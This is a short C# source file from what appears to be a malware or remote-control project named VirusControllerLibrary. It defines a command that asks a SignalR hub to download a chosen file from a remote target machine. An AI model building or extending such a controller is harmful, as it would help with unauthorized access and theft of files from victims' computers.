using Microsoft.AspNetCore.SignalR.Client;
using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    public class DownloadFileCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        public string TargetId { get; private set; }
        public string FilePath { get; private set; }
        public override string Name => "DownloadFile";

        public DownloadFileCommand(string targetId, string filePath)
        {
            TargetId = targetId;
            FilePath = filePath;
        }

        public override async Task ExecuteAsync() =>
            await _hubConnection?.InvokeAsync(Name, TargetId, FilePath);
    }
}
